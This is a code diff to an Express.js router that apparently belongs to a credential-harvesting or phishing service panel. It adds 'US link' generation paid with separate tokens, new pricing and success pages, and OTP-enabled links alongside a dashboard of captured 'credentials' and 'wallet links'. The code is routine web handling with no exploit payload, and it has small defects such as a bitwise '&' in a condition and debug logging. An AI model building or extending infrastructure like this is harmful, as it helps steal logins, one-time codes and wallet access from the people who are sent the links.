@@ -33,11 +33,17 @@ router.get("/dashboard", ensureAuthenticated, async (req, res) => {
         return res.render("dashboard", { req, credentials, moment, walletlinkscount, credentialscount, linkscount, links, layout: "layout2" });
     } catch (err) {
         console.log(err)
+        return res.redirect("/dashboard")
     }
 });
 
 router.get("/pricing", ensureAuthenticated, async (req, res) => {
     return res.render("pricing", { moment, req, layout: "layout2" });
+});
+
+
+router.get("/pricing2", ensureAuthenticated, async (req, res) => {
+    return res.render("pricing2", { moment, req, layout: "layout2" });
 });
 
 // CREDENTIALS
@@ -51,6 +57,30 @@ router.get("/links", ensureAuthenticated, async (req, res) => {
     const links = await Links.find({ user: req.user.id });
     return res.render("Links", { links, moment, req, layout: "layout2" });
 });
+
+// router.post("links", ensureAuthenticated, async (req, res) => {
+//     try {
+//         const { linkID } = req.body;
+
+
+//         const link = await Links.findById(linkID);
+
+//         const currentDate = new Date();
+//         const newExp = new Date(currentDate);
+//         newExp.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
+
+//         if (link) {
+//             await Links.updateOne({ _id: linkID }, {
+//                 expiry: newExp
+//             })
+//         }
+//         req.flash("success_msg", "Link renewed successfully")
+//         return res.redirect("/links")
+//     } catch (err) {
+//         console.log(err)
+//         return res.redirect("/dashboard")
+//     }
+// })
 
 router.get("/wallet-links", ensureAuthenticated, async (req, res) => {
     const links = await WalletLink.find({ user: req.user.id });
@@ -98,39 +128,52 @@ router.post("/create-link", ensureAuthenticated, async (req, res) => {
             linkType,
             modelName,
             otpEnabled,
-            duration
+            duration,
+            usLink
         } = req.body;
+
+        console.log(req.body)
 
         if (!linkTypes.includes(linkType) || !modelName || !name || !duration) {
             req.flash("error_msg", "Fill all fields correctly");
             return res.redirect("/create-link");
         }
 
-        if (req.user.tokens < Math.abs(duration)) {
+        if (usLink == "false" & (req.user.tokens < Math.abs(duration))) {
+            console.log(2)
             req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
+            return res.redirect("/create-link");
+        }
+
+        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
+            req.flash("error_msg", "Insufficient US tokens, purchase tokens to continue");
             return res.redirect("/create-link");
         }
 
         const uid = new ShortUniqueId({ length: 10 });
         const uniqueID = modelName.split(" ").join("-").toLowerCase() + "-" + uid.rnd();
-
         const currentDate = new Date();
         const newDate = new Date(currentDate);
         newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
-
         const newLink = new Links({
             linkType,
             name: name.trim(),
             modelName: modelName.trim(),
             otpEnabled,
+            usLink,
             link: uniqueID,
             user: req.user.id,
             expiry: newDate
         });
         await newLink.save();
-        await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - Math.abs(duration) });
         req.flash("success_msg", "Link generated successfully!");
-        return res.redirect(`/successful-link/${uniqueID}`);
+        if (usLink == 'true') {
+            await User.updateOne({ username: req.user.username }, { usTokens: req.user.usTokens - Math.abs(duration) });
+            return res.redirect(`/successful-link3/${uniqueID}`);
+        } else {
+            await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - Math.abs(duration) });
+            return res.redirect(`/successful-link/${uniqueID}`);
+        }
     } catch (err) {
         console.log(err);
         return res.redirect("/notfound");
@@ -144,6 +187,7 @@ router.post("/create-link2", ensureAuthenticated, async (req, res) => {
             linkType,
             modelName,
             otpEnabled,
+            usLink,
             picture,
             duration
         } = req.body;
@@ -153,8 +197,14 @@ router.post("/create-link2", ensureAuthenticated, async (req, res) => {
             return res.redirect("/create-link");
         }
 
-        if (req.user.tokens < Math.abs(duration)) {
+        if (usLink == "false" & (req.user.tokens < Math.abs(duration))) {
+            console.log(2)
             req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
+            return res.redirect("/create-link");
+        }
+
+        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
+            req.flash("error_msg", "Insufficient US tokens, purchase tokens to continue");
             return res.redirect("/create-link");
         }
 
@@ -164,22 +214,26 @@ router.post("/create-link2", ensureAuthenticated, async (req, res) => {
         const currentDate = new Date();
         const newDate = new Date(currentDate);
         newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
-
-
         const newLink = new Links({
             linkType,
             name: name.trim(),
             modelName: modelName.trim(),
             otpEnabled,
+            usLink,
             picture,
             link: uniqueID,
             user: req.user.id,
             expiry: newDate
         });
         await newLink.save();
-        await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - Math.abs(duration) });
         req.flash("success_msg", "Link generated successfully!");
-        return res.redirect(`/successful-link2/${uniqueID}`);
+        if (usLink == 'true') {
+            await User.updateOne({ username: req.user.username }, { usTokens: req.user.usTokens - Math.abs(duration) });
+            return res.redirect(`/successful-link4/${uniqueID}`);
+        } else {
+            await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - Math.abs(duration) });
+            return res.redirect(`/successful-link2/${uniqueID}`);
+        }
     } catch (err) {
         console.log(err);
         return res.redirect("/notfound");
@@ -256,6 +310,28 @@ router.get("/successful-link2/:id", ensureAuthenticated, async (req, res) => {
         const id = req.params.id;
         const link = await Links.findOne({ link: id });
         return res.render("successfulLink2", { req, id, moment, link, layout: "layout2" });
+    } catch (err) {
+        console.log(err);
+        return res.redirect("/notfound");
+    }
+});
+
+router.get("/successful-link3/:id", ensureAuthenticated, async (req, res) => {
+    try {
+        const id = req.params.id;
+        const link = await Links.findOne({ link: id });
+        return res.render("successfulLink3", { req, id, moment, link, layout: "layout2" });
+    } catch (err) {
+        console.log(err);
+        return res.redirect("/notfound");
+    }
+});
+
+router.get("/successful-link4/:id", ensureAuthenticated, async (req, res) => {
+    try {
+        const id = req.params.id;
+        const link = await Links.findOne({ link: id });
+        return res.render("successfulLink4", { req, id, moment, link, layout: "layout2" });
     } catch (err) {
         console.log(err);
         return res.redirect("/notfound");
